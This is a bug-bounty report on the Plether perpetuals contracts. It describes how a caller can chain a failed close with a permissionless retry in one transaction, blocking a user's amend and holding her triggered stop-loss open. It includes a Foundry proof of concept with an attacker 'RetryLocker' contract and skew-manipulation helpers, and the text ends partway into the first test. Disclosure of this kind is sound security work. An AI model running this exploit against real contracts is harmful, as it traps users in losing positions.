# \#99945 [SC-High] Missing owner priority in retryPositionProtectionClose allows any caller to keep amendLatchedPositionProtectionCloseLimits reverting and hold a triggered stop-loss position open

**Submitted on Nov 15th 2026 at 20:20:44 UTC by @Persona404 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99945
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A stop-loss or take-profit that has triggered cannot be closed, cancelled or replaced by its owner. If its close attempt fails on the owner's own fee ceilings, the protection becomes Latched, and the one remedy the project documents is for the owner to change the ceilings with amendLatchedPositionProtectionCloseLimits. That call only works while the protection is Latched. retryPositionProtectionClose is open to anyone, needs the same state, and can run in the same transaction that ends the failed attempt. A caller who ends every attempt and retries in one transaction keeps the protection in Triggered at every transaction boundary. The owner's amend reverts each time, and she stays in a position whose stop has already fired while the price keeps moving. The same caller can cause the failure in the first place by adding skew, which lifts the victim's close VPI above her ceiling when that ceiling is below about 47 bps of the close notional. The amend path was added by the MED-9 fix (PR #124) after the commit Cecuro audited, so this is a new bug introduced by a fix. I claim Griefing, Medium, and nothing above it.

## Vulnerability Details

**The state machine.** A protection stores four close ceilings chosen by the owner: execution notional, gross account debit, action charge and explicit fees. Every close attempt, including every retry, copies them. When an attempt is executed and an assessed amount is above its ceiling, the attempt ends as Failed with ConstraintViolation and handleFailedProtectionAttempt moves the protection from Triggered to Latched (PositionProtectionBook.sol:637-675).

In Triggered and in Latched the owner has no ordinary exit. Each of these reverts, and the PoC asserts every one in both states:

- a manual close through OrderRouter.commitOrder: OrderRouter__ProtectionActive (router/OrderLiquidationBatchLogic.sol:313-315)
- cancelPositionProtection, cancelPositionProtectionAndCommitClose and replacePositionProtection: OrderRouter__ProtectionNotArmed (PositionProtectionBook.sol:413-419, 346-348, 272-277)

What is left is the amend (PositionProtectionBook.sol:315-328):

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The retry (PositionProtectionBook.sol:382-405) starts with the same two conditions and has no caller check and no delay:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    // linked-order checks, then the new attempt is committed and the status is Triggered again
```

**The lock.** The attacker uses a small contract with no role (RetryLocker in the PoC) that does one of two things in a single transaction:

1. router.executeOrder(attempt, pythData), then book.retryPositionProtectionClose(id). The attempt fails on the ceiling, the protection is Latched only inside that transaction, and the retry puts it back in Triggered with a fresh attempt.
2. router.clearInvalidOrders([attempt]), then the same retry. This ends an attempt whose execution window has passed (60 seconds in the repository fixture) and needs no price data.

Either way the owner never finds the protection Latched between two transactions, and her amend reverts with OrderRouter__ProtectionNotLatched. Variant 2 needs one transaction per execution window.

**How the attempt comes to fail.** Three ways:

a. Forced by the attacker in a live market. The policy evaluator counts close VPI in the action charge that is tested against maxActionChargeAssets (CfdOrderPolicyEvaluatorBase.sol:412-414 and 509-513). The attacker opens a position on the other side up to just under the skew cap. The victim's close then adds to the skew and is charged VPI instead of getting a rebate. Measured: 51.906870 USDG on an 11,000 USDG close (47.18 bps), against 3.900999 USDG quoted when the stop was armed.
b. Without the attacker's help in a frozen market. A frozen close pays the 0.50 % frozen spread on top of the fee. Measured: 58.904793 USDG on the same close, above a ceiling of 0.50 % of notional.
c. Without the attacker's help in a live market, whenever the owner's ceilings are too tight for the conditions at execution. This is the case the documentation describes.

In (b) and (c) the attacker needs no capital, only the retry transactions.

**Guards on the path.**

| Guard | Predicate | Does the attack bypass it? | Invariant it protects |
| --- | --- | --- | --- |
| amend | status is Latched and the owner has no pending order | No. It is simply never true when the owner's transaction runs. | A live attempt keeps the ceilings that applied when it was committed. |
| retry | status is Latched, position unchanged, account has no pending order, previous attempt is terminal | No. The attacker meets every condition. | One live attempt per protection, one pending order per account. |
| ceilings at execution | assessed amount is at most the owner's ceiling | No. The attempt fails exactly as the ceiling requires. | The owner's fee policy for an automated close. |

The invariant that is broken is a separate one: the owner's documented right to change the ceilings between two attempts. Nothing in the code reserves any moment for her to do it.

**What the owner can still do.** I state this plainly because it limits the finding.

- She can act as her own keeper: execute the live attempt herself with a signed Pyth update, or clear it after expiry, and send the amend as her next transaction. If no retry is sequenced between the two, the amend succeeds and she gets out (PoC test 5, case B). If the attacker's retry lands between them, the amend reverts again (case A). In the same block as the attacker's transaction there is no exit, because the new attempt cannot be executed yet (test 5). I cannot show on a local chain who wins that ordering on Arbitrum, so I do not claim a freeze.
- Collateral outside the position is not affected. She can withdraw free balance (test 5).
- The lock ends when the attacker stops, when the skew is removed (test 7), or when the position is liquidated (test 8). A price back inside the stop does not end it, because a retry never checks the trigger again (test 7).

**Why this is not a known issue.** The program page says: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." MED-9 is such a finding. amendLatchedPositionProtectionCloseLimits does not exist at the audited commit 6d6622f2. PR #124 (commit eadc5c58) added it as the owner's remedy inside the MED-9 fix.

These are the project statements I found that touch the behaviour, each quoted in full.

1. Cecuro report, MED-9, status Acknowledged. The project comment is labelled Addressed and reads: "The protection retains trader-selected ceilings for execution notional, gross account debit, action charges and explicit fees, and copies them into both the initial close and every permissionless retry. Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them. Limits use six-decimal USDC: zero means zero allowance and uint256.max explicitly opts into unlimited allowance. A triggered close remains a market close, so these financial ceilings do not guarantee a fill at the trigger price. Tight limits may prevent execution until conditions improve or the owner amends them."
   This accepts that tight limits can stop execution, and it names two ways out: conditions improve, or the owner amends. This report is about the second way out being closable by anyone, for as long as they like. In variant (a) the same party also prevents the first.

2. PR #124, section "Accepted trade-offs and known limitations": "Financial ceilings apply per close attempt and can prevent execution; the owner may amend limits after relatch. They are not a cumulative budget across retries." The same PR lists as a security property: "Triggered and retried closes retain the owner's financial ceilings. Only the owner can amend latched limits."
   Same answer. The second sentence says who is allowed to amend. It does not say the owner is able to.

3. AI scan, "State-driven VPI increases are classified as user-invalid margin failures" (info), claim: "An open can be valid when committed and later fail with MARGIN_DRAINED_BY_FEES solely because other accounts change global side skew or pool depth, increasing its VPI charge before execution. planOpen uses the resulting state-dependent tradeCostUsdc in planOpenCostApplication, but getExecutionFailurePolicyCategory classifies every MARGIN_DRAINED_BY_FEES result as UserInvalid rather than ProtocolStateInvalidated. An unprivileged account can therefore move skew ahead of a tightly funded victim order and cause the victim's execution to enter the router's user-fault failure lifecycle, potentially forfeiting/absorbing the victim's reserved execution bounty even though the invalidation came from protocol-wide market state rather than the victim changing inputs or collateral."
   This is the skew primitive I use in (a), described for opens. I am not reporting it. On its own it only makes the victim pay 48.005871 USDG more after she amends (test 2). The harm in this report comes from the amend being unreachable.

4. AI scan, "Protection trigger bounty is paid before a zero-bounty close is executed" (low), claim: "A permissionless caller can collect the entire position-protection trigger bounty as soon as a trigger is observed and a close attempt is merely queued, while the queued close and every retry carry a zero execution bounty. The caller can abandon the flow after receiving payment; because same-block execution is normally disallowed and later execution requires another oracle-funded transaction, unrelated keepers have no order-specific compensation to finish the close. The protection becomes Triggered (and later Latched on expiry/failure), cannot be cancelled through the pre-trigger cancellation path, and the protected position can remain open through its stop-loss/take-profit threshold and incur further loss or liquidation." Its evidence adds: "Official linked implementation only permits cancellation before triggering; a Triggered or Latched protection cannot be cancelled to regain ordinary close control."
   This establishes that a Triggered or Latched protection cannot be cancelled, which is why the amend is the only remedy. It describes a keeper that walks away. It does not describe a caller that keeps the amend unreachable.

5. SECURITY.md, protection lifecycle: "Triggering is irreversible. `Triggered` means the Book has exactly one current live child; `Latched` means the trigger evidence and account trade lock remain but no child is live. A non-liquidation terminal child failure relatches only when the protected position still has the exact recorded account, side, and size; otherwise the protection fails and releases the active lock. Retry is permissionless and validates the latest child/reverse mapping so an old or spoofed callback cannot replace the current attempt. It does not re-evaluate the threshold, and a recovered price cannot cancel the close mandate."
   Permissionless retry is documented and I do not dispute it. What is not documented is that a retry made in the same transaction as the failure removes the Latched window the amend depends on.

6. SECURITY.md, Known Limitations: "failed protection-attempt cleanup is deliberately unpaid; each retry creates a fresh zero-bounty close record. The separate trigger reward is paid once on the original trigger. Liveness depends on keepers processing the terminal attempt and separately appending a retry, and operators must alert on prolonged `Latched` state without a live child,"
   This is about too little keeper activity. The attack is the opposite, and it never leaves the protection Latched without a live attempt, so the alert it asks for does not fire.

7. DEPLOYMENT.md: "A trigger queues a close; it promises neither its execution price nor execution before liquidation." and, for the reference worker: "A conservative worker retries expiry failures only after confirming the account has no pending orders, queue capacity is available, and valid execution data is obtainable. Investigate planner, constraint, or other persistent failures before retrying; do not continuously queue the same failing attempt."
   The first accepts that a close may not execute. It does not accept that the owner loses the means to make it execute. The second is advice for the project's own worker. The program page says: "Keepers are not trusted: anyone can execute orders, liquidations, price updates and protections, so harm caused by any caller acting as a keeper is in scope." and "Researchers should consider any contract-permitted behavior, including deviations from the reference implementation."

8. The documents that promise the remedy. WORKING_WITH_AI_AGENTS.md: "If a queued close fails and the protected side and size still match, protection becomes `Latched`; the owner may amend its limits before retrying." CANONICAL_ENTRYPOINTS.md: "The owner may amend the close ceilings of a `Latched` protection with `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits(uint64,CloseFinancialLimits)` when the account has no pending Router order."

I searched the documents in packages/perps, the audit reports in the repository and PR #124 for the amend and for statements about retries. None of them says that a third party can keep the amend unreachable.

## Impact Details

Selected impact: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol). Severity Medium. The attacker earns nothing from the lock.

What the PoC measures. Release risk parameters, pool 1.0M USDG, victim LONG 10,000 tokens with 2,000 USDG margin and a stop-loss at 1.10:

- Control, no attacker: the stop-loss closes at 1.10 and the victim's balance goes from 19,995.300999 to 18,991.200000 USDG.
- Lock held for 8 attacker transactions while the price goes from 1.10 to 1.17: the victim ends at 18,236.675417 USDG, 754.524583 worse than the control. 700.000000 of that is the price move while she was locked, 54.524583 is extra fees and VPI.
- Lock held until liquidation at 1.20: the victim loses 1,995.700999 USDG from trigger to liquidation, against 1,004.100999 in the control.
- Lock held for 3,721 seconds with 61 transactions and no price data (test 6), and the same in a frozen market with no attacker funds in the protocol (test 9).

The price path in these tests is my assumption. The lock does not move the price. What it takes from the victim is the exit her stop-loss had already ordered. She carries the full price risk of the position for as long as the lock holds, up to the loss of her whole margin, and she pays the higher VPI when she does get out.

Who is affected:

- Variant (a) only reaches victims whose action-charge ceiling is below what the attacker's skew can add. In the tested state a ceiling of 0.44 % of close notional fails, 0.50 % executes and unlimited executes (test 3). The assessed charge was 47.18 bps at the 1.0M pool and 46.65 bps at a 50M pool. There is no protocol default for the ceilings. The project's client fixtures (packages/perps-aa-client/test/protection.test.ts, out of scope) use 0.50 %, and the project's own Solidity tests use unlimited. A user with the client-fixture ratio is not affected by (a). A user with unlimited ceilings is not affected at all.
- Variant (b) reaches ceilings up to the frozen cost, 58.904793 USDG or about 53.5 bps of this close, which includes the 0.50 % client-fixture ratio (test 9 uses exactly that ratio). Its precondition is not created by the attacker: the protection must already be Triggered or Latched when the market freezes, because triggers do not fire in a frozen market. In test 9 the first attempt expires unexecuted on Friday before the close.
- In every variant a victim who ends the attempt herself and gets her amend in as the very next transaction escapes.

Attacker cost, against the program's baseline: "Applies to High or Critical findings where the attacker gains no profit. The baseline is that spending USD 1 to cause USD 10 or less in damage is Griefing, while spending USD 1 to cause USD 100 or more in damage is not. Ratios between these are evaluated case by case."

- Variant (a), 1.0M pool: the attacker deposits 10,020.004990 USDG and opens a SHORT of 398,700 tokens. After unwinding, the attack cost it 346.274574 USDG in test 4 and 335.108742 USDG for an immediate unwind in test 6, plus 0.922592 USDG for holding 3,721 seconds. Against the 754.524583 USDG victim loss in test 4 that is about 2.2 USD of damage per USD spent. Only 54.524583 of the damage is independent of the price path, about 0.16 USD per USD spent.
- Variant (a), 50M pool: deposit 500,020.000099 USDG, SHORT of 19,410,700 tokens, 16,305.223316 USDG for an immediate unwind (test 10). Against one victim of this size the attacker spends far more than the damage. The same position locks every victim on that side whose ceiling is below the threshold. I did not test more than one victim.
- Variant (b): no capital, 61 transactions per hour, gas only.

The cost figures leave out the market move on the attacker's own SHORT, which is ordinary exposure and not a result of the attack. Every ratio above is at or below 1 to 10, which is Griefing under the baseline.

Not claimed: "Temporary freezing of funds for at least 1 hour" and "Temporary freezing of funds for at least 24 hours". An owner who executes the attempt herself and amends in two uninterrupted transactions gets out, and I cannot show locally that the attacker wins the ordering against such an owner. Tests 6 and 9 hold the lock for over an hour only against an owner who does not do that.

On the out-of-scope row "Impacts requiring basic economic and governance attacks (e.g. 51% attack)": variant (a) needs a large position, which the attacker gets back minus fees. The lock itself needs no capital, and variants (b) and (c) use none.

Recommended fix, any one of:

1. Let the owner amend while an attempt is live: accept Triggered in the amend, cancel the live zero-bounty attempt, store the new ceilings and queue the next attempt.
2. Give the owner priority after a failed attempt: for a short period after an attempt ends on a ceiling, only the owner may retry, or at least a retry may not share a transaction with the end of the previous attempt.
3. Let the owner cancel a Triggered or Latched protection into an ordinary bounded close, as cancelPositionProtectionAndCommitClose already does for Armed.

Options 1 and 3 remove the dependence on transaction ordering.

## References

- amendLatchedPositionProtectionCloseLimits and retryPositionProtectionClose: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L405
- handleFailedProtectionAttempt: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675
- Action charge and ceilings: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L410-L514
- Manual close blocked while a protection is active: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- PR #124, the MED-9 fix that added the amend: https://github.com/Plether-Fi/plether-core/pull/124
- Cecuro report, MED-9: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- AI scan: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md
- SECURITY.md, DEPLOYMENT.md, CANONICAL_ENTRYPOINTS.md, WORKING_WITH_AI_AGENTS.md: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps

I am happy to address any technical concerns, clarify assumptions, or provide additional evidence. If any aspect of the report may affect its validity or severity assessment, please let me know so I can respond before a final determination is made.

## Proof of Concept

The PoC is a Foundry test in the repository's own test suite at the commit in scope. It changes no contract in scope. Pyth and USDG are the repository mocks, which the program allows. Risk parameters are the release values from packages/perps/DEPLOYMENT.md (maintenance margin 10 bps, initial margin 20 bps, frozen-market margin 300 bps, vpiFactor 0.01e18, maxSkewRatio 0.4e18, carry 500 bps), set through the fixture hook `_riskParams`. Everything else is the repository fixture test/perps/BasePerpTest.sol: execution fee 4 bps, frozen-close spread 50 bps, trigger bounty 0.20 USDG, execution window 60 s, pool 1,002,000 USDG in tests 1 to 9 and 50M USDG in test 10.

Victim, attacker, keeper and bystander are plain addresses with no role. Every position is opened and closed through the production `OrderRouter.commitOrder(OrderRequest)` and `OrderRouter.executeOrder`. The fixture deploys the Router as LegacyOrderRouterHarness, which inherits OrderRouter unchanged; the PoC does not use its legacy helper. Accounts are funded by minting the mock USDG, and prices are set through the Pyth mock. The test uses cheatcodes only to set msg.sender, move time and blocks, expect reverts, record logs and take snapshots for control branches. It uses no `deal` and no `vm.store` on a contract in scope. One fixture shortcut is outside my test: BasePerpTest.setUp seeds the LP pool before the scenario starts and, while doing so, installs the first mark and settles the first LP epoch as the Router.

The victim's ceilings are my example, since the protocol has no default: in tests 1, 2, 4 to 8 and 10 they are three times the close charge that the in-scope CfdEngineLens.previewClose quotes at the stop price when the stop is armed. Test 3 varies the ceiling and test 9 uses the ratios of the project's client fixtures.

Environment setup:

1. Install Foundry. I ran forge 1.7.1 (commit 4072e48). The program names Forge 1.5.1, which I did not have installed. Solidity 0.8.35 is downloaded by forge.
2. Clone the repository at the commit in scope:

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
```

Reproduction:

3. Save the following file as packages/perps/test/poc/ProtectionAmendLock.t.sol:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes as P} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice The attacker's contract. It holds no role. Each function ends the owner's current close attempt and
///         queues the next one in the same transaction, so the protection is never Latched between transactions.
contract RetryLocker {

    /// Ends a live attempt by executing it (it fails on the owner's ceiling), then retries.
    function executeAndRetry(
        OrderRouter router,
        IPositionProtectionActions book,
        uint64 attemptId,
        bytes[] calldata pythData,
        uint64 protectionId
    ) external returns (OrderV3Types.LifecycleStatus status, uint64 nextAttemptId) {
        status = router.executeOrder(attemptId, pythData).status;
        nextAttemptId = book.retryPositionProtectionClose(protectionId);
    }

    /// Ends an expired attempt without any price data, then retries.
    function clearAndRetry(
        OrderRouter router,
        IPositionProtectionActions book,
        uint64 attemptId,
        uint64 protectionId
    ) external returns (uint256 cleared, uint64 nextAttemptId) {
        uint64[] memory ids = new uint64[](1);
        ids[0] = attemptId;
        (, cleared) = router.clearInvalidOrders(ids);
        nextAttemptId = book.retryPositionProtectionClose(protectionId);
    }

}

/// @dev Shared setup. Risk parameters are the release values from packages/perps/DEPLOYMENT.md. Everything else is
///      the repository fixture BasePerpTest (execution fee 4 bps, frozen-close spread 50 bps, execution window 60 s,
///      MockPyth, mock USDG). Victim, attacker and keeper are plain addresses without roles. Every position is
///      opened and closed through the production OrderRouter.commitOrder(OrderRequest) and executeOrder.
abstract contract AmendLockBase is BasePerpTest {

    uint256 internal constant PRICE_OPEN = 1e8; // 1.00
    uint256 internal constant STOP = 110_000_000; // victim stop-loss at 1.10 (a LONG loses when the price rises)
    uint256 internal constant SIZE = 10_000e18;
    uint256 internal constant MARGIN = 2000e6;

    address internal victim = makeAddr("poc victim");
    address internal attacker = makeAddr("poc attacker");
    address internal keeper = makeAddr("poc honest keeper");
    address internal bystander = makeAddr("poc bystander");

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal bookViews;
    RetryLocker internal locker;
    uint256 internal nonce;
    uint256 internal attackerDeposit;
    uint256 internal quotedCharge;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public virtual override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        bookViews = IPositionProtectionViews(address(book));
        _fundTrader(victim, 20_000e6);
        _refreshMark(PRICE_OPEN);
        _startRecordingLogs();
    }

    // ---------------------------------------------------------------- oracle and order helpers

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), engine.lastMarkTime())
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    /// A V3 order request with the caller's own bounds left wide open.
    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        uint64 window = uint64(router.maxExecutionWindowSeconds());
        r.clientOrderId = bytes32(++nonce);
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.isClose = isClose;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? engine.CAP_PRICE() : 1;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + window,
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory r = _request(side, size, margin, isClose);
        vm.prank(account);
        orderId = router.commitOrder(r);
    }

    /// Next block, next second, fresh mock Pyth price, then an unprivileged keeper executes the order.
    function _execute(
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(keeper);
        result = router.executeOrder(orderId, data);
    }

    function _mustExecute(
        uint64 orderId,
        uint256 price
    ) internal {
        assertEq(uint8(_execute(orderId, price).status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
    }

    function _mustFail(
        uint64 orderId,
        uint256 price
    ) internal {
        assertEq(uint8(_execute(orderId, price).status), uint8(OrderV3Types.LifecycleStatus.Failed), "failed");
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _balance(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account);
    }

    function _status(
        uint64 pid
    ) internal view returns (P.PositionProtectionStatus) {
        return bookViews.getPositionProtection(pid).status;
    }

    function _isLatched(
        uint64 pid
    ) internal view returns (bool) {
        return _status(pid) == P.PositionProtectionStatus.Latched;
    }

    function _isTriggered(
        uint64 pid
    ) internal view returns (bool) {
        return _status(pid) == P.PositionProtectionStatus.Triggered;
    }

    function _unlimited() internal pure returns (P.CloseFinancialLimits memory l) {
        l = P.CloseFinancialLimits(type(uint256).max, type(uint256).max, type(uint256).max, type(uint256).max);
    }

    // ---------------------------------------------------------------- victim

    /// The victim opens LONG 10,000 at 1.00 with 2,000 USDG margin and arms a stop-loss at 1.10. Price ceilings are
    /// unlimited so that only fees can make an attempt fail. With actionCeiling == 0 both fee ceilings are three
    /// times the charge that the in-scope CfdEngineLens.previewClose quotes for a close at the stop price.
    function _victimOpensAndArms(
        uint256 actionCeiling,
        uint256 explicitCeiling
    ) internal returns (uint64 pid) {
        _mustExecute(_commit(victim, CfdTypes.Side.LONG, SIZE, MARGIN, false), PRICE_OPEN);
        assertEq(_size(victim), SIZE, "victim position open");
        _refreshMark(PRICE_OPEN); // arming needs a current oracle observation
        ICfdEngineTypes.ClosePreview memory quote = engineLens.previewClose(victim, SIZE, STOP);
        P.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP;
        params.closeLimits = _unlimited();
        params.closeLimits.maxActionChargeAssets = actionCeiling == 0 ? quote.executionFeeAssets * 3 : actionCeiling;
        params.closeLimits.maxExplicitFeesAssets = actionCeiling == 0 ? quote.executionFeeAssets * 3 : explicitCeiling;
        vm.prank(victim);
        pid = book.createPositionProtection(params);
        quotedCharge = quote.executionFeeAssets;
    }

    function _logQuote() internal {
        emit log_named_decimal_uint("close charge quoted at arming", quotedCharge, 6);
        emit log_named_decimal_uint("victim fee ceilings (3x the quote)", quotedCharge * 3, 6);
    }

    /// Any caller triggers the stop-loss once the price is at the stop. Returns the queued close attempt.
    function _trigger(
        uint64 pid,
        uint256 price
    ) internal returns (uint64 attemptId) {
        _mockPythUpdateData(price);
        bytes[] memory data = _livePriceData(price);
        vm.prank(keeper);
        attemptId = book.triggerPositionProtection(pid, data);
    }

    function _amendReverts(
        uint64 pid
    ) internal {
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
    }

    /// Every other way out for the owner: manual close, cancel, cancel-and-close, replace.
    function _noOtherExit(
        uint64 pid
    ) internal {
        OrderV3Types.OrderRequest memory closeRequest = _request(CfdTypes.Side.LONG, SIZE, 0, true);
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(closeRequest);
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(pid);
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(pid, closeRequest);
        P.PositionProtectionParams memory replacement;
        replacement.stopLossTriggerPrice = STOP + 1_000_000;
        replacement.closeLimits = _unlimited();
        vm.prank(victim);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.replacePositionProtection(pid, replacement);
    }

    // ---------------------------------------------------------------- attacker

    /// The attacker deposits 1% of pool depth and opens a SHORT that brings skew to 97% of the 0.4 skew cap.
    function _attackerOpens() internal returns (uint256 size) {
        vm.prank(attacker);
        locker = new RetryLocker();
        uint256 depth = pool.totalAssets();
        attackerDeposit = depth / 100;
        _fundTrader(attacker, attackerDeposit);
        size = ((((depth * 4 / 10) * 97 / 100 + 10_000e6) * 1e12) / 1e20) * 1e20;
        _mustExecute(_commit(attacker, CfdTypes.Side.SHORT, size, depth / 250, false), PRICE_OPEN);
        assertEq(_size(attacker), size, "attacker position open");
    }

    /// The attacker closes its position. A victim attempt queued ahead of it is executed first and fails.
    function _attackerCloses(
        uint64 attemptAhead,
        uint256 size,
        uint256 price
    ) internal {
        uint64 closeId = _commit(attacker, CfdTypes.Side.SHORT, size, 0, true);
        if (attemptAhead != 0) {
            _mustFail(attemptAhead, price);
        }
        _mustExecute(closeId, price);
        assertEq(_size(attacker), 0, "attacker flat");
    }

    /// What the attack cost the attacker once it is flat again, with the market move on its SHORT taken out
    /// (a SHORT gains when the price rises): deposit + price PnL - final balance.
    function _attackerCost(
        uint256 size,
        uint256 closePrice
    ) internal view returns (int256) {
        int256 pricePnl = (int256(size) * (int256(closePrice) - int256(PRICE_OPEN))) / 1e20;
        return int256(attackerDeposit) + pricePnl - int256(_balance(attacker));
    }

    function _cycle(
        uint64 attemptId,
        uint256 price,
        uint64 pid
    ) internal returns (uint64 nextAttemptId) {
        bytes[] memory data = _mockPythUpdateData(price);
        OrderV3Types.LifecycleStatus status;
        vm.prank(attacker);
        (status, nextAttemptId) = locker.executeAndRetry(router, book, attemptId, data, pid);
        assertEq(uint8(status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt failed on the ceiling");
        assertTrue(_isTriggered(pid), "a new attempt is live");
    }

    function _failure(
        uint64 attemptId
    ) internal returns (OrderV3Types.FailureDetails memory) {
        return _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), attemptId).failure;
    }

}

contract ProtectionAmendLockPoC is AmendLockBase {

    /// 1. Control. No attacker: the triggered stop-loss closes inside the victim's ceilings.
    function test_01_Control_StopLossClosesWithoutAttacker() public {
